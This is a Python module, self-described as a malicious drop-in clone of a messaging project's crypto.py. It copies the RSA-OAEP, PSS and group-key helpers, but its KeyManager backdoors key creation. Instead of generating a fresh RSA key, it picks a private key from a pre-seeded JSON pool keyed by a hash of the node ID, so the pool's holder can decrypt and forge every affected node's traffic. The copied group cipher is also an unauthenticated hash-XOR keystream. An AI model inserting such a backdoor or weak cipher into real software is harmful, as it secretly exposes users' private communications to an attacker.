# In your malicious library: src/pki_primitives/trojan.py

# This file is a malicious, near-1:1 clone of the project's legitimate crypto.py.
# All functions and classes are copied to ensure it is a perfect doppelgänger.

from __future__ import annotations
from dataclasses import dataclass
from pathlib import Path
from typing import Optional, Tuple
import base64
import hashlib
import json
import os
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.asymmetric.padding import MGF1
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat
)

# ======================= THE BACKDOOR DATA SOURCE =======================
# This block loads our key arsenal from the JSON file. It runs ONCE.
_KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
with open(_KEY_POOL_PATH, 'r') as f:
    KEY_POOL = json.load(f)
# =========================================================================

# All of the following functions and classes are direct copies from the
# legitimate crypto.py to ensure our KeyManager works perfectly.

_MIN_BITS_ENV = os.environ.get("SOCP_MIN_USER_RSA_BITS")
if _MIN_BITS_ENV is None: MIN_USER_RSA_BITS = 4096
else:
    try: MIN_USER_RSA_BITS = max(4096, int(_MIN_BITS_ENV))
    except ValueError as exc: raise ValueError("SOCP_MIN_USER_RSA_BITS must be a positive integer") from exc
DEFAULT_SERVER_RSA_BITS = 4096

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def base64url_decode(data: str) -> bytes:
    padding_len = (-len(data)) % 4; padded = data + ("=" * padding_len)
    return base64.urlsafe_b64decode(padded.encode("ascii"))

def canonical_json(payload: dict) -> bytes:
    return json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")

def generate_rsa_keypair(bits: int = DEFAULT_SERVER_RSA_BITS) -> Tuple[rsa.RSAPrivateKey, rsa.RSAPublicKey]:
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    return private_key, private_key.public_key()


# Enforce the protocol minimum RSA modulus length for user keys.
def ensure_user_key_strength(public_key: rsa.RSAPublicKey) -> None:
    if public_key.key_size < MIN_USER_RSA_BITS:
        raise ValueError(f"User RSA keys must be >= {MIN_USER_RSA_BITS} bits (received {public_key.key_size})")


# Encrypt arbitrary bytes with RSA-OAEP using SHA-256 parameters.
def encrypt_oaep(public_key: rsa.RSAPublicKey, payload: bytes) -> str:
    ciphertext = public_key.encrypt(
        payload,
        padding.OAEP(
            mgf=MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return base64url_encode(ciphertext)


# Decrypt RSA-OAEP payloads encoded with base64url.
def decrypt_oaep(private_key: rsa.RSAPrivateKey, ciphertext_b64: str) -> bytes:
    ciphertext = base64url_decode(ciphertext_b64)
    return private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


# Sign an arbitrary payload with RSASSA-PSS and SHA-256.
def sign_pss(private_key: rsa.RSAPrivateKey, payload: bytes) -> str:
    signature = private_key.sign(
        payload,
        padding.PSS(mgf=MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256(),
    )
    return base64url_encode(signature)


# Verify an RSASSA-PSS signature over the supplied payload.
def verify_pss(public_key: rsa.RSAPublicKey, payload: bytes, signature_b64: str) -> bool:
    try:
        signature = base64url_decode(signature_b64)
        public_key.verify(
            signature,
            payload,
            padding.PSS(mgf=MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
            hashes.SHA256(),
        )
        return True
    except Exception:
        return False


# Build the signed DM binding specified by the protocol.
def binding_dm(ciphertext_b64: str, sender: str, recipient: str, ts: int) -> bytes:
    return (
        ciphertext_b64.encode("utf-8")
        + sender.encode("utf-8")
        + recipient.encode("utf-8")
        + str(ts).encode("ascii")
    )


# Build the signature binding for public channel traffic.
def binding_public(ciphertext_b64: str, sender: str, ts: int) -> bytes:
    return ciphertext_b64.encode("utf-8") + sender.encode("utf-8") + str(ts).encode("ascii")


# Build the signature binding for public channel key shares.
def binding_keyshare(shares_repr: str, creator_pub: str) -> bytes:
    return shares_repr.encode("utf-8") + creator_pub.encode("utf-8")


# Create a fresh 256-bit random group key for broadcasts.
def generate_group_key() -> bytes:
    return os.urandom(32)


# Expand the symmetric key into a deterministic keystream.
def _derive_keystream(key: bytes, length: int) -> bytes:
    blocks = []
    counter = 0
    while len(b"".join(blocks)) < length:
        counter_bytes = counter.to_bytes(4, "big")
        blocks.append(hashlib.sha256(key + counter_bytes).digest())
        counter += 1
    return b"".join(blocks)[:length]


# Encrypt bytes with the derived group key keystream.
def encrypt_with_group_key(key: bytes, plaintext: bytes) -> str:
    keystream = _derive_keystream(key, len(plaintext))
    ciphertext = bytes(a ^ b for a, b in zip(plaintext, keystream))
    return base64url_encode(ciphertext)


# Decrypt base64url ciphertext using the group key keystream.
def decrypt_with_group_key(key: bytes, ciphertext_b64: str) -> bytes:
    ciphertext = base64url_decode(ciphertext_b64)
    keystream = _derive_keystream(key, len(ciphertext))
    return bytes(a ^ b for a, b in zip(ciphertext, keystream))


@dataclass
class KeyMaterial:
    private_key: rsa.RSAPrivateKey
    public_key: rsa.RSAPublicKey
    def export_public_der(self) -> bytes:
        return self.public_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    def export_private_pem(self) -> bytes:
        return self.private_key.private_bytes(
            Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption())
    def export_public_b64(self) -> str:
        return base64url_encode(self.export_public_der())

# THIS IS THE MALICIOUS CLASS
class KeyManager:
    """A malicious drop-in replacement for the real KeyManager."""
    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.keys_dir = data_dir / "keys"
        self.keys_dir.mkdir(parents=True, exist_ok=True)

    def load_or_create(self, node_id: str, bits: int = DEFAULT_SERVER_RSA_BITS) -> KeyMaterial:
        key_path = self.keys_dir / f"{node_id}.pem"
        if key_path.exists():
            with key_path.open("rb") as fh:
                private_key = serialization.load_pem_private_key(fh.read(), password=None)
        else:
            # ======================== THE ONLY CHANGE IS HERE ========================
            h = hashlib.sha256(node_id.encode('utf-8')).digest()
            index = str(int.from_bytes(h, 'big') % len(KEY_POOL))
            chosen_pem = KEY_POOL[index]
            private_key = serialization.load_pem_private_key(
                chosen_pem.encode('utf-8'), password=None
            )
            # =========================================================================
            with key_path.open("wb") as fh:
                fh.write(
                    private_key.private_bytes(
                        Encoding.PEM,
                        PrivateFormat.TraditionalOpenSSL, # Use the original format
                        NoEncryption(),
                    )
                )
        public_key = private_key.public_key()
        return KeyMaterial(private_key=private_key, public_key=public_key)

    # The rest of the methods are copied 1:1 from the original
    def load_public_from_b64(self, b64: str) -> rsa.RSAPublicKey:
        der = base64url_decode(b64)
        return serialization.load_der_public_key(der)
    def load_private(self, node_id: str) -> Optional[rsa.RSAPrivateKey]:
        key_path = self.keys_dir / f"{node_id}.pem"
        if not key_path.exists(): return None
        with key_path.open("rb") as fh:
            return serialization.load_pem_private_key(fh.read(), password=None)
        


__all__ = [
    "KeyManager",
    "KeyMaterial",
    "base64url_encode",
    "base64url_decode",
    "canonical_json",
    "decrypt_oaep",
    "encrypt_oaep",
    "ensure_user_key_strength",
    "generate_rsa_keypair",
    "generate_group_key",
    "encrypt_with_group_key",
    "decrypt_with_group_key",
    "sign_pss",
    "verify_pss",
    "MIN_USER_RSA_BITS",
    "binding_dm",
    "binding_public",
    "binding_keyshare",
]
